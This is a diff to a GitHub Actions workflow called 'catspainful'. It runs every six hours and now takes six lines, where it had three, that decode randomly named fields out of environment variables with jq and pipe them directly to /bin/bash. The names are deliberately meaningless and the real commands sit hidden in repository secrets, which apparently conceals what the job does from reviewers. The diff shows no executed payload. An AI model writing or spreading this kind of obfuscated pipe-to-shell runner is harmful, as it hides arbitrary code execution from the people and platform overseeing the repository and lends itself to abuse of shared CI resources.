@@ -1,9 +1,9 @@
 name: catspainful
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 0/6 * * *'
+    - cron: '20 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,9 +12,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: catspainful
         env:
-          i059: ${{ secrets.i059 }}
+          skfqv9062: ${{ secrets.skfqv9062 }}
         run: |
-          echo $i059 | jq -r .y09 | /bin/bash
-          echo $r596 | jq -r .aydpp9 | /bin/bash
-          echo $ialju512 | jq -r .syo86645 | /bin/bash
+          echo $skfqv9062 | jq -r .nkev3175 | /bin/bash
+          echo $hz06700 | jq -r .sjs7 | /bin/bash
+          echo $sn5720 | jq -r .tdo32269 | /bin/bash
+          echo $ttj86 | jq -r .pyrgy6206 | /bin/bash
+          echo $lbgjp274 | jq -r .xfpe8093 | /bin/bash
+          echo $qhkd35431 | jq -r .xb9749 | /bin/bash
 
